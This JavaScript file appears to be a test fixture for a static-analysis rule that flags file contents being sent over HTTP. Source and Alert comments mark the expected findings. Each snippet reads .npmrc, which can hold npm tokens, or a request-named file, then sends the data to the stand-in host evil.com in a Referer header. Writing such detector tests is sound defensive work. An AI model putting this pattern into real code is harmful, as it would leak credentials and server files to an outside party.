var fs = require("fs"),
    https = require("https");

var content = fs.readFileSync(".npmrc", "utf8"); // $ Source[js/file-access-to-http]
https.get({
  hostname: "evil.com",
  path: "/upload",
  method: "GET",
  headers: { Referer: content }
}, () => { }); // $ Alert[js/file-access-to-http]

const fsp = require("fs").promises;

(async function sendRequest() {
  try {
    const content = await fsp.readFile(".npmrc", "utf8"); // $ Source[js/file-access-to-http]

    https.get({
      hostname: "evil.com",
      path: "/upload",
      method: "GET",
      headers: { Referer: content }
    }, () => { }); // $ Alert[js/file-access-to-http]

  } catch (error) {
    console.error("Error reading file:", error);
  }
})();

app.post('/readv', async (req, res) => {
  const { filename } = req.body;
  const fd = await fsp.open(filename, 'r'); 

  const buffer = [Buffer.alloc(1024), Buffer.alloc(1024)]; // $ Source[js/file-access-to-http]
  const bytesRead = fs.readvSync(fd, buffer); 
  https.get({
    hostname: "evil.com",
    path: "/upload",
    method: "GET",
    headers: { Referer: buffer }
  }, () => { }); // $ Alert[js/file-access-to-http]

  const buffer1 = Buffer.alloc(1024); // $ Source[js/file-access-to-http]
  const bytesRead1 = fs.readvSync(fd, [buffer1]); 
  https.get({
    hostname: "evil.com",
    path: "/upload",
    method: "GET",
    headers: { Referer: buffer1.slice(0, bytesRead1).toString() }
  }, () => { }); // $ Alert[js/file-access-to-http]

  const buffer2 = Buffer.alloc(1024); // $ Source[js/file-access-to-http]
  fs.readv(fd, [buffer2], (err, bytesRead2) => {
    https.get({
      hostname: "evil.com",
      path: "/upload",
      method: "GET",
      headers: { Referer: buffer2.slice(0, bytesRead2).toString() }
    }, () => { }); // $ Alert[js/file-access-to-http]
  }); 
});
